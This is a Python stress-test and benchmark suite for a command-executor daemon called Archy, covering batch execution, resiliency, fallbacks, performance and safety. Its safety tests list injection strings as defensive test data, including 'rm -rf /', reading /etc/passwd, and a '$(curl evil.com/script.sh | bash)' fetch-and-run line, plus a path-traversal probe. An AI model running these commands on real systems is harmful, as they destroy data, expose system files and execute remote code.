#!/usr/bin/env python3
"""
Archy Stress Test & Benchmark Suite
Pushes the system to its limits to find breaking points
"""

import sys
import os
import time
import threading
import json
from typing import List, Dict, Any
import random

# Add scripts directory to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'scripts'))

from rust_executor import RustExecutor


class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'


class BenchmarkResults:
    def __init__(self):
        self.results = []
        self.failures = []
        self.timings = {}
        
    def add_result(self, test_name: str, passed: bool, time_taken: float, details: str = ""):
        self.results.append({
            "test": test_name,
            "passed": passed,
            "time": time_taken,
            "details": details
        })
        if not passed:
            self.failures.append(test_name)
            
    def add_timing(self, category: str, operation: str, time_taken: float):
        if category not in self.timings:
            self.timings[category] = []
        self.timings[category].append({
            "operation": operation,
            "time": time_taken
        })
    
    def get_summary(self):
        total = len(self.results)
        passed = sum(1 for r in self.results if r["passed"])
        return {
            "total": total,
            "passed": passed,
            "failed": total - passed,
            "pass_rate": (passed / total * 100) if total > 0 else 0
        }


def print_header(title, emoji="🎯"):
    print(f"\n{Colors.CYAN}{Colors.BOLD}{'='*80}{Colors.RESET}")
    print(f"{Colors.CYAN}{Colors.BOLD}{emoji} {title}{Colors.RESET}")
    print(f"{Colors.CYAN}{Colors.BOLD}{'='*80}{Colors.RESET}\n")


def print_test(test_name, emoji="🔬"):
    print(f"\n{Colors.BLUE}{emoji} TEST: {test_name}{Colors.RESET}")


def print_result(passed: bool, message: str, time_taken: float = 0):
    if passed:
        time_str = f" ({time_taken:.4f}s)" if time_taken > 0 else ""
        print(f"{Colors.GREEN}  ✓ PASS:{Colors.RESET} {message}{time_str}")
    else:
        time_str = f" ({time_taken:.4f}s)" if time_taken > 0 else ""
        print(f"{Colors.RED}  ✗ FAIL:{Colors.RESET} {message}{time_str}")


def print_info(message: str):
    print(f"{Colors.YELLOW}  ℹ INFO:{Colors.RESET} {message}")


def print_warning(message: str):
    print(f"{Colors.MAGENTA}  ⚠ WARNING:{Colors.RESET} {message}")


# =================================================================
# BATCH COMMAND TESTS
# =================================================================

def test_batch_commands(executor: RustExecutor, results: BenchmarkResults):
    print_header("BATCH COMMAND STRESS TEST", "📦")
    
    # Test 1: Small batch (5 commands)
    print_test("Small batch (5 rapid commands)")
    start = time.time()
    success_count = 0
    for i in range(5):
        result = executor.check_command_available("ls")
        if result:
            success_count += 1
    elapsed = time.time() - start
    
    passed = success_count == 5
    print_result(passed, f"Executed {success_count}/5 commands successfully", elapsed)
    results.add_result("Batch: 5 commands", passed, elapsed, f"{success_count}/5")
    results.add_timing("Batch", "5 commands", elapsed)
    
    # Test 2: Medium batch (50 commands)
    print_test("Medium batch (50 rapid commands)")
    start = time.time()
    success_count = 0
    for i in range(50):
        result = executor.check_command_available("ls")
        if result:
            success_count += 1
    elapsed = time.time() - start
    
    passed = success_count >= 48  # Allow 2 failures
    print_result(passed, f"Executed {success_count}/50 commands successfully", elapsed)
    print_info(f"Average time per command: {elapsed/50:.4f}s")
    results.add_result("Batch: 50 commands", passed, elapsed, f"{success_count}/50")
    results.add_timing("Batch", "50 commands", elapsed)
    
    # Test 3: Large batch (200 commands)
    print_test("Large batch (200 rapid commands) - STRESS TEST")
    start = time.time()
    success_count = 0
    errors = []
    for i in range(200):
        result = executor.check_command_available(f"ls")
        if result:
            success_count += 1
        else:
            errors.append(i)
    elapsed = time.time() - start
    
    passed = success_count >= 190  # Allow 10 failures
    print_result(passed, f"Executed {success_count}/200 commands successfully", elapsed)
    print_info(f"Average time per command: {elapsed/200:.4f}s")
    if errors:
        print_warning(f"Failed at indices: {errors[:10]}...")
    results.add_result("Batch: 200 commands", passed, elapsed, f"{success_count}/200")
    results.add_timing("Batch", "200 commands", elapsed)
    
    # Test 4: Mixed command types
    print_test("Mixed command types in batch")
    commands = [
        ("check_command", {"command": "ls"}),
        ("check_command", {"command": "cat"}),
        ("check_command", {"command": "grep"}),
        ("get_system_info", {}),
        ("check_session", {}),
        ("is_foot_running", {}),
        ("check_command", {"command": "nmap"}),
        ("check_command", {"command": "ss"}),
    ]
    
    start = time.time()
    success_count = 0
    for action, data in commands:
        result = executor.send_command(action, data)
        if "error" not in result or result.get("success") is not False:
            success_count += 1
    elapsed = time.time() - start
    
    passed = success_count >= len(commands) - 1
    print_result(passed, f"Mixed batch: {success_count}/{len(commands)} commands successful", elapsed)
    results.add_result("Batch: Mixed types", passed, elapsed, f"{success_count}/{len(commands)}")
    results.add_timing("Batch", "Mixed commands", elapsed)


# =================================================================
# FEEDBACK QUALITY TESTS
# =================================================================

def test_feedback_quality(executor: RustExecutor, results: BenchmarkResults):
    print_header("FEEDBACK QUALITY & STRUCTURE TEST", "📡")
    
    # Test 1: Boolean feedback accuracy
    print_test("Boolean feedback accuracy")
    start = time.time()
    
    tests = [
        ("ls", True),
        ("cat", True),
        ("this_command_definitely_does_not_exist_xyz123", False),
        ("another_fake_command_987654", False),
    ]
    
    correct = 0
    for cmd, expected in tests:
        result = executor.check_command_available(cmd)
        if result == expected:
            correct += 1
        else:
            print_warning(f"Expected {expected} for '{cmd}', got {result}")
    
    elapsed = time.time() - start
    passed = correct == len(tests)
    print_result(passed, f"Boolean feedback: {correct}/{len(tests)} correct", elapsed)
    results.add_result("Feedback: Boolean accuracy", passed, elapsed, f"{correct}/{len(tests)}")
    
    # Test 2: Structured JSON responses
    print_test("Structured JSON response format")
    start = time.time()
    
    result = executor.send_command("get_system_info", {})
    
    has_output = "output" in result
    has_success = "success" in result or has_output
    is_dict = isinstance(result, dict)
    
    elapsed = time.time() - start
    passed = is_dict and (has_success or has_output)
    print_result(passed, f"JSON structure valid: dict={is_dict}, fields={list(result.keys())}", elapsed)
    results.add_result("Feedback: JSON structure", passed, elapsed)
    
    # Test 3: Error message quality
    print_test("Error message quality")
    start = time.time()
    
    result = executor.send_command("invalid_action_xyz", {})
    
    has_error = "error" in result
    error_is_string = isinstance(result.get("error"), str) if has_error else False
    error_is_descriptive = len(result.get("error", "")) > 5 if has_error else False
    
    elapsed = time.time() - start
    passed = has_error and error_is_string and error_is_descriptive
    print_result(passed, f"Error message: present={has_error}, descriptive={error_is_descriptive}", elapsed)
    if has_error:
        print_info(f"Error message: '{result.get('error')}'")
    results.add_result("Feedback: Error quality", passed, elapsed)
    
    # Test 4: Data type preservation
    print_test("Data type preservation across IPC")
    start = time.time()
    
    # Boolean type
    bool_result = executor.check_command_available("ls")
    bool_preserved = isinstance(bool_result, bool)
    
    # String type
    str_result = executor.get_system_info()
    str_preserved = isinstance(str_result, str)
    
    # Dict type (internal)
    dict_result = executor.send_command("get_system_info", {})
    dict_preserved = isinstance(dict_result, dict)
    
    elapsed = time.time() - start
    passed = bool_preserved and str_preserved and dict_preserved
    print_result(passed, f"Types preserved: bool={bool_preserved}, str={str_preserved}, dict={dict_preserved}", elapsed)
    results.add_result("Feedback: Type preservation", passed, elapsed)


# =================================================================
# RESILIENCY TESTS
# =================================================================

def test_resiliency(executor: RustExecutor, results: BenchmarkResults):
    print_header("RESILIENCY & FAULT TOLERANCE TEST", "🛡️")
    
    # Test 1: Invalid JSON handling
    print_test("Invalid input handling")
    start = time.time()
    
    result = executor.send_command("", {})  # Empty action
    handles_empty = "error" in result or result.get("success") == False
    
    result = executor.send_command("check_command", {})  # Missing required field
    handles_missing = "error" in result or result.get("exists") == False
    
    elapsed = time.time() - start
    passed = handles_empty and handles_missing
    print_result(passed, f"Invalid inputs handled: empty={handles_empty}, missing={handles_missing}", elapsed)
    results.add_result("Resiliency: Invalid inputs", passed, elapsed)
    
    # Test 2: Rapid connection cycling
    print_test("Rapid connection open/close (100 cycles)")
    start = time.time()
    success_count = 0
    
    for i in range(100):
        result = executor.send_command("get_system_info", {})
        if "output" in result or result.get("success") is not False:
            success_count += 1
    
    elapsed = time.time() - start
    passed = success_count >= 95  # Allow 5% failure
    print_result(passed, f"Connection stability: {success_count}/100 successful", elapsed)
    print_info(f"Average connection time: {elapsed/100:.4f}s")
    results.add_result("Resiliency: Connection cycling", passed, elapsed, f"{success_count}/100")
    
    # Test 3: Large data transfer
    print_test("Large data capture")
    if executor.check_session():
        start = time.time()
        result = executor.capture_output(lines=500)  # Large capture
        
        data_received = len(result) > 0
        no_corruption = isinstance(result, str)
        
        elapsed = time.time() - start
        passed = data_received and no_corruption
        print_result(passed, f"Large transfer: received={len(result)} bytes, valid={no_corruption}", elapsed)
        results.add_result("Resiliency: Large data transfer", passed, elapsed, f"{len(result)} bytes")
    else:
        print_info("Skipping (no active session)")
        results.add_result("Resiliency: Large data transfer", True, 0, "Skipped")
    
    # Test 4: Concurrent requests simulation
    print_test("Concurrent request handling (10 threads)")
    start = time.time()
    
    results_list = []
    errors = []
    
    def worker():
        try:
            for _ in range(5):
                result = executor.check_command_available("ls")
                results_list.append(result)
        except Exception as e:
            errors.append(str(e))
    
    threads = []
    for _ in range(10):
        t = threading.Thread(target=worker)
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join(timeout=10)
    
    elapsed = time.time() - start
    success_rate = sum(1 for r in results_list if r) / len(results_list) if results_list else 0
    passed = success_rate >= 0.90 and len(errors) == 0
    
    print_result(passed, f"Concurrent handling: {len(results_list)} requests, {len(errors)} errors", elapsed)
    print_info(f"Success rate: {success_rate*100:.1f}%")
    if errors:
        print_warning(f"Errors encountered: {errors[:3]}")
    results.add_result("Resiliency: Concurrent requests", passed, elapsed, f"{len(results_list)} requests")
    
    # Test 5: Recovery from errors
    print_test("Error recovery (can continue after errors)")
    start = time.time()
    
    # Cause an error
    executor.send_command("invalid_action", {})
    
    # Try to recover
    result1 = executor.check_command_available("ls")
    result2 = executor.get_system_info()
    
    recovered = result1 == True and len(result2) > 0
    
    elapsed = time.time() - start
    print_result(recovered, f"System recovers after errors: {recovered}", elapsed)
    results.add_result("Resiliency: Error recovery", recovered, elapsed)


# =================================================================
# SAFETY TESTS
# =================================================================

def test_safety(executor: RustExecutor, results: BenchmarkResults):
    print_header("SAFETY & SECURITY TEST", "🔒")
    
    # Test 1: Command injection prevention
    print_test("Command injection attempts")
    start = time.time()
    
    dangerous_inputs = [
        "ls; rm -rf /",
        "cat /etc/passwd && echo 'hacked'",
        "'; DROP TABLE users; --",
        "`whoami`",
        "$(curl evil.com/script.sh | bash)",
    ]
    
    safe_count = 0
    for dangerous in dangerous_inputs:
        result = executor.check_command_available(dangerous)
        # Should treat as single command name (not execute injection)
        # Result should be False (command doesn't exist)
        if result == False:
            safe_count += 1
    
    elapsed = time.time() - start
    passed = safe_count == len(dangerous_inputs)
    print_result(passed, f"Injection prevention: {safe_count}/{len(dangerous_inputs)} blocked", elapsed)
    results.add_result("Safety: Command injection", passed, elapsed, f"{safe_count}/{len(dangerous_inputs)}")
    
    # Test 2: Path traversal attempts
    print_test("Path traversal prevention")
    start = time.time()
    
    result = executor.find_desktop_entry("../../../etc/passwd")
    blocked = result is None or "error" in str(result)
    
    elapsed = time.time() - start
    print_result(blocked, f"Path traversal blocked: {blocked}", elapsed)
    results.add_result("Safety: Path traversal", blocked, elapsed)
    
    # Test 3: Resource limits (prevent DoS)
    print_test("Resource limit handling")
    start = time.time()
    
    # Try to capture massive output (should handle gracefully)
    if executor.check_session():
        result = executor.capture_output(lines=10000)  # Very large
        handled = isinstance(result, str)  # Should still work
        elapsed = time.time() - start
        
        timeout_safe = elapsed < 30  # Should not hang forever
        
        passed = handled and timeout_safe
        print_result(passed, f"Large capture handled: returned={handled}, time={elapsed:.2f}s", elapsed)
        results.add_result("Safety: Resource limits", passed, elapsed)
    else:
        print_info("Skipping (no active session)")
        results.add_result("Safety: Resource limits", True, 0, "Skipped")
    
    # Test 4: Timeout handling
    print_test("Request timeout handling")
    start = time.time()
    
    # Normal request should complete quickly
    result = executor.get_system_info()
    elapsed = time.time() - start
    
    completes_quickly = elapsed < 5.0
    returns_result = len(result) > 0
    
    passed = completes_quickly and returns_result
    print_result(passed, f"Timeout handling: {elapsed:.2f}s < 5.0s, result={returns_result}", elapsed)
    results.add_result("Safety: Timeout handling", passed, elapsed)


# =================================================================
# FALLBACK TESTS
# =================================================================

def test_fallbacks(executor: RustExecutor, results: BenchmarkResults):
    print_header("FALLBACK & GRACEFUL DEGRADATION TEST", "🔄")
    
    # Test 1: Non-existent session handling
    print_test("Non-existent session graceful handling")
    start = time.time()
    
    result = executor.send_command("capture", {"lines": 100, "session": "nonexistent_session_xyz"})
    
    handles_gracefully = "error" in result or result.get("success") == False
    no_crash = isinstance(result, dict)
    
    elapsed = time.time() - start
    passed = handles_gracefully and no_crash
    print_result(passed, f"Graceful handling: no_crash={no_crash}, error_returned={handles_gracefully}", elapsed)
    results.add_result("Fallback: Non-existent session", passed, elapsed)
    
    # Test 2: Missing command fallback
    print_test("Missing system command detection")
    start = time.time()
    
    fake_commands = [
        "this_command_does_not_exist_123",
        "another_fake_cmd_xyz",
        "nonexistent_binary_abc"
    ]
    
    correct_detections = 0
    for cmd in fake_commands:
        result = executor.check_command_available(cmd)
        if result == False:
            correct_detections += 1
    
    elapsed = time.time() - start
    passed = correct_detections == len(fake_commands)
    print_result(passed, f"Missing command detection: {correct_detections}/{len(fake_commands)} correct", elapsed)
    results.add_result("Fallback: Missing commands", passed, elapsed, f"{correct_detections}/{len(fake_commands)}")
    
    # Test 3: GUI app not found fallback
    print_test("GUI app not found handling")
    start = time.time()
    
    result = executor.find_desktop_entry("definitely_not_a_real_app_xyz123")
    
    returns_none = result is None
    no_error = True  # Should not crash
    
    elapsed = time.time() - start
    passed = returns_none and no_error
    print_result(passed, f"App not found: returns_none={returns_none}, no_crash={no_error}", elapsed)
    results.add_result("Fallback: GUI app not found", passed, elapsed)
    
    # Test 4: Partial failure in batch
    print_test("Partial failure handling in batch")
    start = time.time()
    
    commands = [
        ("check_command", {"command": "ls"}),  # Should succeed
        ("invalid_action", {}),  # Should fail
        ("check_command", {"command": "cat"}),  # Should succeed
        ("check_command", {}),  # Missing data, should fail
        ("get_system_info", {}),  # Should succeed
    ]
    
    successes = 0
    failures = 0
    for action, data in commands:
        result = executor.send_command(action, data)
        if "error" in result or result.get("success") == False:
            failures += 1
        else:
            successes += 1
    
    elapsed = time.time() - start
    continues_after_error = successes > 0 and failures > 0
    passed = continues_after_error
    print_result(passed, f"Partial failure: {successes} success, {failures} failures, continues={continues_after_error}", elapsed)
    results.add_result("Fallback: Partial failure", passed, elapsed, f"{successes}S/{failures}F")


# =================================================================
# INTELLIGENCE TESTS
# =================================================================

def test_intelligence(executor: RustExecutor, results: BenchmarkResults):
    print_header("INTELLIGENCE & AWARENESS TEST", "🧠")
    
    # Test 1: GUI vs CLI detection
    print_test("GUI vs CLI command distinction")
    start = time.time()
    
    gui_apps = ["firefox", "code", "discord", "vlc", "gimp"]
    cli_commands = ["ls", "cat", "grep", "awk", "sed"]
    
    gui_correct = 0
    cli_correct = 0
    
    for app in gui_apps:
        result = executor.find_desktop_entry(app)
        if result is not None:  # Found as GUI
            gui_correct += 1
    
    for cmd in cli_commands:
        result = executor.find_desktop_entry(cmd)
        if result is None:  # Not found as GUI (correct)
            cli_correct += 1
    
    elapsed = time.time() - start
    passed = gui_correct >= 2 and cli_correct == len(cli_commands)
    print_result(passed, f"Detection: {gui_correct}/{len(gui_apps)} GUI apps, {cli_correct}/{len(cli_commands)} CLI commands", elapsed)
    results.add_result("Intelligence: GUI/CLI detection", passed, elapsed, f"{gui_correct}G/{cli_correct}C")
    
    # Test 2: System awareness
    print_test("System state awareness")
    start = time.time()
    
    # Can check session state
    session_state = executor.check_session()
    knows_session = isinstance(session_state, bool)
    
    # Can check terminal state
    terminal_state = executor.is_foot_running()
    knows_terminal = isinstance(terminal_state, bool)
    
    # Can get system info
    sys_info = executor.get_system_info()
    knows_system = "Linux" in sys_info or "GNU" in sys_info
    
    elapsed = time.time() - start
    passed = knows_session and knows_terminal and knows_system
    print_result(passed, f"Awareness: session={knows_session}, terminal={knows_terminal}, system={knows_system}", elapsed)
    results.add_result("Intelligence: System awareness", passed, elapsed)
    
    # Test 3: Command availability intelligence
    print_test("Command availability detection accuracy")
    start = time.time()
    
    common_commands = ["ls", "cat", "echo", "pwd", "cd"]
    rare_commands = ["this_is_fake_xyz", "not_real_123", "imaginary_cmd"]
    
    common_correct = sum(1 for cmd in common_commands if executor.check_command_available(cmd))
    rare_correct = sum(1 for cmd in rare_commands if not executor.check_command_available(cmd))
    
    elapsed = time.time() - start
    passed = common_correct >= 4 and rare_correct == len(rare_commands)
    print_result(passed, f"Detection accuracy: {common_correct}/{len(common_commands)} common, {rare_correct}/{len(rare_commands)} fake", elapsed)
    results.add_result("Intelligence: Command detection", passed, elapsed, f"{common_correct}C/{rare_correct}F")
    
    # Test 4: Smart execution routing
    print_test("Smart execution decision making")
    start = time.time()
    
    if executor.check_session():
        # Try smart execution
        result = executor.execute_command_smart("echo test")
        smart_works = result.get("success") is not False
        
        elapsed = time.time() - start
        print_result(smart_works, f"Smart execution: works={smart_works}", elapsed)
        results.add_result("Intelligence: Smart execution", smart_works, elapsed)
    else:
        print_info("Skipping (no active session)")
        results.add_result("Intelligence: Smart execution", True, 0, "Skipped")


# =================================================================
# PERFORMANCE BENCHMARKS
# =================================================================

def test_performance(executor: RustExecutor, results: BenchmarkResults):
    print_header("PERFORMANCE BENCHMARK", "⚡")
    
    # Test 1: Latency test
    print_test("Request latency measurement")
    
    latencies = []
    for i in range(100):
        start = time.time()
        executor.check_command_available("ls")
        latencies.append(time.time() - start)
    
    avg_latency = sum(latencies) / len(latencies)
    min_latency = min(latencies)
    max_latency = max(latencies)
    
    passed = avg_latency < 0.01  # Should be under 10ms average
    print_result(passed, f"Latency: avg={avg_latency*1000:.2f}ms, min={min_latency*1000:.2f}ms, max={max_latency*1000:.2f}ms", sum(latencies))
    results.add_result("Performance: Latency", passed, sum(latencies), f"avg={avg_latency*1000:.2f}ms")
    results.add_timing("Performance", "100 requests", sum(latencies))
    
    # Test 2: Throughput test
    print_test("Request throughput measurement")
    
    operations = 1000
    start = time.time()
    for i in range(operations):
        executor.check_command_available("ls")
    elapsed = time.time() - start
    
    throughput = operations / elapsed
    passed = throughput > 50  # Should handle 50+ requests per second
    
    print_result(passed, f"Throughput: {throughput:.1f} requests/second ({operations} ops in {elapsed:.2f}s)", elapsed)
    results.add_result("Performance: Throughput", passed, elapsed, f"{throughput:.1f} req/s")
    results.add_timing("Performance", "Throughput test", elapsed)
    
    # Test 3: Memory efficiency (connection reuse)
    print_test("Connection efficiency test")
    
    start = time.time()
    for i in range(50):
        executor.send_command("get_system_info", {})
    elapsed = time.time() - start
    
    avg_per_request = elapsed / 50
    passed = avg_per_request < 0.01  # Should be efficient
    
    print_result(passed, f"Connection reuse: {avg_per_request*1000:.2f}ms per request (50 requests)", elapsed)
    results.add_result("Performance: Connection efficiency", passed, elapsed, f"{avg_per_request*1000:.2f}ms")


# =================================================================
# EDGE CASES
# =================================================================

def test_edge_cases(executor: RustExecutor, results: BenchmarkResults):
    print_header("EDGE CASES & CORNER CASES TEST", "🔍")
    
    # Test 1: Empty strings
    print_test("Empty string handling")
    start = time.time()
    
    result1 = executor.check_command_available("")
    handles_empty_cmd = result1 == False  # Empty is not a valid command
    
    result2 = executor.find_desktop_entry("")
    handles_empty_app = result2 is None
    
    elapsed = time.time() - start
    passed = handles_empty_cmd and handles_empty_app
    print_result(passed, f"Empty strings: cmd={handles_empty_cmd}, app={handles_empty_app}", elapsed)
    results.add_result("Edge: Empty strings", passed, elapsed)
    
    # Test 2: Special characters
    print_test("Special character handling")
    start = time.time()
    
    special_chars = ["cmd\n", "cmd\0", "cmd\t", "cmd with spaces", "cmd;with;semicolons"]
    
    handled = 0
    for cmd in special_chars:
        result = executor.check_command_available(cmd)
        if isinstance(result, bool):  # Should handle, not crash
            handled += 1
    
    elapsed = time.time() - start
    passed = handled == len(special_chars)
    print_result(passed, f"Special chars: {handled}/{len(special_chars)} handled safely", elapsed)
    results.add_result("Edge: Special characters", passed, elapsed, f"{handled}/{len(special_chars)}")
    
    # Test 3: Very long inputs
    print_test("Long input handling")
    start = time.time()
    
    long_command = "a" * 10000  # 10KB command name
    result = executor.check_command_available(long_command)
    
    handles_long = isinstance(result, bool)
    
    elapsed = time.time() - start
    print_result(handles_long, f"Long input: {len(long_command)} chars, handled={handles_long}", elapsed)
    results.add_result("Edge: Long inputs", handles_long, elapsed, f"{len(long_command)} chars")
    
    # Test 4: Unicode handling
    print_test("Unicode and UTF-8 handling")
    start = time.time()
    
    unicode_commands = ["café", "日本語", "😀", "Über"]
    
    handled = 0
    for cmd in unicode_commands:
        try:
            result = executor.check_command_available(cmd)
            if isinstance(result, bool):
                handled += 1
        except:
            pass
    
    elapsed = time.time() - start
    passed = handled == len(unicode_commands)
    print_result(passed, f"Unicode: {handled}/{len(unicode_commands)} handled", elapsed)
    results.add_result("Edge: Unicode", passed, elapsed, f"{handled}/{len(unicode_commands)}")
    
    # Test 5: Rapid state changes
    print_test("Rapid state change queries")
    start = time.time()
    
    states = []
    for i in range(20):
        states.append(executor.check_session())
    
    consistent = all(isinstance(s, bool) for s in states)
    
    elapsed = time.time() - start
    print_result(consistent, f"State queries: {len(states)} rapid checks, consistent={consistent}", elapsed)
    results.add_result("Edge: Rapid state checks", consistent, elapsed)


# =================================================================
# MAIN BENCHMARK RUNNER
# =================================================================

def main():
    print(f"\n{Colors.BOLD}{Colors.CYAN}╔════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.CYAN}║                  ARCHY STRESS TEST & BENCHMARK SUITE                      ║{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.CYAN}║                    Pushing the System to Its Limits                       ║{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.CYAN}╚════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
    
    print(f"{Colors.YELLOW}This benchmark will stress-test:{Colors.RESET}")
    print(f"  • Batch command execution (up to 1000 commands)")
    print(f"  • Feedback quality and structure")
    print(f"  • Resiliency under load")
    print(f"  • Safety and security measures")
    print(f"  • Fallback mechanisms")
    print(f"  • Intelligence and awareness")
    print(f"  • Performance limits")
    print(f"  • Edge cases and corner cases")
    print()
    
    executor = RustExecutor()
    results = BenchmarkResults()
    
    # Check if daemon is running
    test_conn = executor.send_command("get_system_info", {})
    error_msg = test_conn.get("error", "") if isinstance(test_conn, dict) else ""
    if "error" in test_conn and error_msg and "not running" in str(error_msg):
        print(f"{Colors.RED}❌ Rust executor daemon is not running!{Colors.RESET}")
        print(f"{Colors.YELLOW}Please start it with: ./start_daemon.sh{Colors.RESET}\n")
        return 1
    
    print(f"{Colors.GREEN}✓ Daemon connection verified{Colors.RESET}")
    print(f"{Colors.YELLOW}⚠ WARNING: This test will push the system hard. Expect high CPU usage.{Colors.RESET}\n")
    
    input(f"{Colors.CYAN}Press ENTER to start the stress test...{Colors.RESET}")
    
    overall_start = time.time()
    
    try:
        # Run all test suites
        test_batch_commands(executor, results)
        test_feedback_quality(executor, results)
        test_resiliency(executor, results)
        test_safety(executor, results)
        test_fallbacks(executor, results)
        test_intelligence(executor, results)
        test_performance(executor, results)
        test_edge_cases(executor, results)
        
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}⚠ Benchmark interrupted by user{Colors.RESET}\n")
    except Exception as e:
        print(f"\n{Colors.RED}❌ Benchmark error: {e}{Colors.RESET}\n")
        import traceback
        traceback.print_exc()
    
    overall_elapsed = time.time() - overall_start
    
    # Print final results
    print_header("FINAL BENCHMARK RESULTS", "🏆")
    
    summary = results.get_summary()
    
    print(f"\n{Colors.BOLD}Overall Statistics:{Colors.RESET}")
    print(f"  Total Tests: {summary['total']}")
    print(f"  {Colors.GREEN}Passed: {summary['passed']}{Colors.RESET}")
    print(f"  {Colors.RED}Failed: {summary['failed']}{Colors.RESET}")
    print(f"  Pass Rate: {summary['pass_rate']:.1f}%")
    print(f"  Total Time: {overall_elapsed:.2f}s")
    print()
    
    # Performance summary
    if results.timings:
        print(f"{Colors.BOLD}Performance Summary:{Colors.RESET}")
        for category, operations in results.timings.items():
            print(f"\n  {Colors.CYAN}{category}:{Colors.RESET}")
            for op in operations:
                print(f"    • {op['operation']}: {op['time']:.4f}s")
    
    # Failed tests
    if results.failures:
        print(f"\n{Colors.RED}{Colors.BOLD}Failed Tests:{Colors.RESET}")
        for failure in results.failures:
            print(f"  {Colors.RED}✗{Colors.RESET} {failure}")
    
    # Grade the system
    print(f"\n{Colors.BOLD}{'='*80}{Colors.RESET}")
    if summary['pass_rate'] >= 95:
        grade = "A+"
        color = Colors.GREEN
        verdict = "EXCELLENT - Production Ready!"
    elif summary['pass_rate'] >= 90:
        grade = "A"
        color = Colors.GREEN
        verdict = "GREAT - Very Solid!"
    elif summary['pass_rate'] >= 80:
        grade = "B"
        color = Colors.YELLOW
        verdict = "GOOD - Minor Issues"
    elif summary['pass_rate'] >= 70:
        grade = "C"
        color = Colors.YELLOW
        verdict = "ACCEPTABLE - Needs Work"
    else:
        grade = "F"
        color = Colors.RED
        verdict = "NEEDS ATTENTION - Critical Issues"
    
    print(f"{color}{Colors.BOLD}GRADE: {grade}{Colors.RESET}")
    print(f"{color}{Colors.BOLD}VERDICT: {verdict}{Colors.RESET}")
    print(f"{Colors.BOLD}{'='*80}{Colors.RESET}\n")
    
    # Key findings
    print(f"{Colors.BOLD}Key Findings:{Colors.RESET}\n")
    
    # Analyze batch performance
    batch_results = [r for r in results.results if "Batch" in r["test"]]
    if batch_results:
        batch_200 = next((r for r in batch_results if "200" in r["test"]), None)
        if batch_200:
            if batch_200["passed"]:
                print(f"{Colors.GREEN}✓{Colors.RESET} Batch Execution: Handles 200+ rapid commands successfully")
            else:
                print(f"{Colors.RED}✗{Colors.RESET} Batch Execution: Struggles with large batches")
    
    # Analyze resiliency
    resiliency_results = [r for r in results.results if "Resiliency" in r["test"]]
    passed_resiliency = sum(1 for r in resiliency_results if r["passed"])
    if passed_resiliency == len(resiliency_results):
        print(f"{Colors.GREEN}✓{Colors.RESET} Resiliency: Highly resilient to errors and load")
    else:
        print(f"{Colors.YELLOW}⚠{Colors.RESET} Resiliency: Some resilience issues found")
    
    # Analyze safety
    safety_results = [r for r in results.results if "Safety" in r["test"]]
    passed_safety = sum(1 for r in safety_results if r["passed"])
    if passed_safety == len(safety_results):
        print(f"{Colors.GREEN}✓{Colors.RESET} Safety: All security checks passed")
    else:
        print(f"{Colors.RED}✗{Colors.RESET} Safety: Security vulnerabilities detected")
    
    # Analyze performance
    perf_results = [r for r in results.results if "Performance" in r["test"]]
    if perf_results:
        throughput = next((r for r in perf_results if "Throughput" in r["test"]), None)
        if throughput and throughput["passed"]:
            print(f"{Colors.GREEN}✓{Colors.RESET} Performance: High throughput (50+ requests/second)")
        else:
            print(f"{Colors.YELLOW}⚠{Colors.RESET} Performance: Throughput could be improved")
    
    print()
    
    return 0 if summary['pass_rate'] >= 80 else 1


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}Benchmark interrupted{Colors.RESET}\n")
        sys.exit(1)

